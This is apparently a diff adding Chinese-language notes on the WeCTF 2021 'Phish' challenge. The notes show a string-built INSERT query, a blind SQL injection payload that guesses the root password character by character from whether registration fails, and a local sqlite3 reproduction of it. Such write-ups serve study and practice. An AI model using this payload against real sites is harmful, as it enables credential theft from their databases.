@@ -1,0 +1,25 @@
+https://github.com/StrixGoldhorn/CTF-Writeups/blob/main/WeCTF%202021/Phish.md
+
+漏洞:
+INSERT INTO users (password, username) VALUES ('{password}', '{username}')
+
+解法:                                                                              位置 長度
+password="a', (SELECT username FROM users WHERE username = 'root' AND password LIKE 's%')); --"
+
+說明:
+如果 root 的 password 第 1 個字元為 s 則註冊失敗 (username: root 已經存在), 如果不是, 還是會失敗, 因為 {username} 欄位會是空的 (SELECT ... 回傳 NULL)
+
+
+
+
+實際測試
+$ sqlite3
+create table users (
+    username TEXT type UNIQUE NOT NULL,
+    password TEXT
+);
+
+insert into users (password, username) values ('secret', 'root');
+insert into users (password, username) values ('a', (SELECT username FROM users WHERE username = 'root' AND password LIKE 's%'));
+
+
